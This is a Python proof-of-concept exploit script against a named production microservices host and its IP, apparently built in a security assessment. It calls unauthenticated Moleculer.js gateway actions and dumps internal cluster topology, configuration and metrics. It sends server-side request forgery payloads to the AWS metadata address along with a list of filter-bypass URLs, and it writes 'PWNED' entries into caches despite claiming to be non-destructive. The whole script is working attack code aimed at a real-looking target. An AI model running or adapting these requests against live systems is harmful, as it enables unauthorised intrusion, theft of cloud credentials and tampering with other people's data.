#!/usr/bin/env python3
"""
PoC: Moleculer.js Unauthenticated API Gateway Exploitation
Target: production-microservices.yk8s.in
Date: 2026-09-23

Usage: python3 moleculer_poc.py
All tests are non-destructive (read-only / harmless PoC requests).
"""

import json
import subprocess
import sys

HOST = "production-microservices.yk8s.in"
IP = "16.163.250.188"
BASE = f"https://{HOST}"

def curl(path, method="GET", data=None, timeout=10, raw=False):
    """Execute curl with --resolve mapping to target IP."""
    cmd = [
        "curl", "-sk", "--resolve", f"{HOST}:443:{IP}",
        "--max-time", str(timeout),
        "-w", "\n[HTTP:%{http_code} Size:%{size_download}]",
        "-X", method, f"{BASE}{path}"
    ]
    if data:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(data)]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
        return r.stdout if r.stdout else r.stderr
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR: {e}]"

def test(name, result, expect_success=True):
    lines = result.strip().split("\n")
    http_line = lines[-1] if lines else ""
    body = "\n".join(lines[:-1]) if len(lines) > 1 else result[:200]
    status = "CONFIRMED" if ("HTTP:200" in http_line or "HTTP 200" in http_line) else f"HTTP other"
    print(f"\n[{'+' if expect_success else '-'}] {name}")
    print(f"  {http_line}")
    print(f"  {body[:300]}")

print("=" * 70)
print("Moleculer.js Unauthenticated API Gateway PoC")
print("=" * 70)

# VULN-1: Unauthenticated action invocation
print("\n--- VULN-1: Unauthenticated API Gateway ---")
test("greeter.hello (GET /api/greeter/hello)",
     curl("/api/greeter/hello"))
test("greeter.welcome (POST /api/greeter/welcome - accepts body)",
     curl("/api/greeter/welcome", method="POST", data={"name": "PWNED"}))

# VULN-2: Infrastructure disclosure
print("\n--- VULN-2: Internal Endpoint Exposure ---")
test("~node/health (system fingerprint)",
     curl("/api/~node/health"))
test("~node/options (config + NATS broker)",
     curl("/api/~node/options"))
test("~node/list (58-node cluster topology)",
     curl("/api/~node/list"))
test("~node/actions (30 exposed actions)",
     curl("/api/~node/actions"))
test("~node/services?withActions=true (full route map)",
     curl("/api/~node/services?withActions=true"))
test("~node/events (event subscriptions)",
     curl("/api/~node/events"))

# VULN-6: Interactive UI
print("\n--- VULN-6: Interactive Web UI Exposure ---")
result = curl("/", timeout=15)
lines = result.strip().split("\n")
print(f"\n[+] GET / (Vue.js SPA)")
print(f"  HTTP: {lines[-1] if lines else 'N/A'}")
if "html" in lines[-2][:100] if len(lines) > 1 else False:
    print("  Content-Type: text/html (interactive UI exposed)")
else:
    text_preview = lines[-2][:200] if len(lines) > 1 else ""
    print(f"  Preview: {text_preview[:200]}")

# VULN-3: SSRF via capture-website (no URL filter)
print("\n--- VULN-3: SSRF via capture-website.capture (NO URL FILTER) ---")
test("capture-website → AWS metadata 169.254.169.254",
     curl("/api/capture-website.capture", method="POST",
          data={"websiteUrl": "http://169.254.169.254/latest/meta-data/",
                "queryString": "m=1", "filename": "test", "ext": "png"},
          timeout=15), expect_success=False)

test("capture-website → external URL (proves URL accepted)",
     curl("/api/capture-website.capture", method="POST",
          data={"websiteUrl": "http://example.com",
                "queryString": "m=1", "filename": "test", "ext": "png"},
          timeout=15), expect_success=False)

# VULN-4: SSRF via ImageOptimizer (has whitelist)
print("\n--- VULN-4: SSRF via ImageOptimizer.imageOptimizer (whitelisted) ---")
test("ImageOptimizer → 127.0.0.1 (whitelist check)",
     curl("/api/ImageOptimizer.imageOptimizer", method="POST",
          data={"originImageUrl": "http://127.0.0.1/latest/meta-data/",
                "queryString": "w=1"}, timeout=15), expect_success=False)

# SSRF bypass attempts on ImageOptimizer
for desc, url in [
    ("hex IP 0x7f.0.0.1", "http://0x7f.0.0.1/latest/meta-data/"),
    ("decimal 2130706433", "http://2130706433/latest/meta-data/"),
    ("IPv6 [::1]", "http://[::1]/latest/meta-data/"),
    ("IPv4-mapped [::ffff:7f00:1]", "http://[::ffff:127.0.0.1]/latest/meta-data/"),
    ("userinfo trick", "http://example.com@127.0.0.1/latest/meta-data/"),
    ("internal hostname", "http://nats.middleware:4222/"),
]:
    test(f"  bypass: {desc}",
         curl("/api/ImageOptimizer.imageOptimizer", method="POST",
              data={"originImageUrl": url, "queryString": "w=1"}, timeout=15),
         expect_success=False)

# VULN-5: Cache poisoning
print("\n--- VULN-5: Cache Poisoning (POST endpoints) ---")
test("json-cache.postCache (write to cache)",
     curl("/api/json-cache/testkey", method="POST",
          data={"value": {"injected": True, "data": "PWNED"}}, timeout=15),
     expect_success=False)

test("api-cache.postCache (poison cached API response)",
     curl("/api/api-cache/victim.com%2Fapi", method="POST",
          data={"response": {"injected": True}}, timeout=15),
     expect_success=False)

test("fb-pixel.postCache (write pixel cache)",
     curl("/api/fb-pixel/TEST", method="POST",
          data={"data": {"injected": True}}, timeout=15),
     expect_success=False)

# VULN-7: Metrics data leak
print("\n--- VULN-7: Prometheus Metrics Exposure ---")
test("~node/metrics (system + service data)",
     curl("/api/~node/metrics", timeout=15))

# Summary from api.listAliases
print("\n--- Route alias map (api.listAliases) ---")
test("GET /api/api/list-aliases",
     curl("/api/api/list-aliases"))

print("\n" + "=" * 70)
print("PoC complete. All evidence saved to:")
print("  ~/Desktop/JySecAI/tpe119_evidence/20260923/")
print("  ~/Desktop/JySecAI/data/poc_drafts/moleculer-unauth-api-gateway-poc.md")
print("=" * 70)
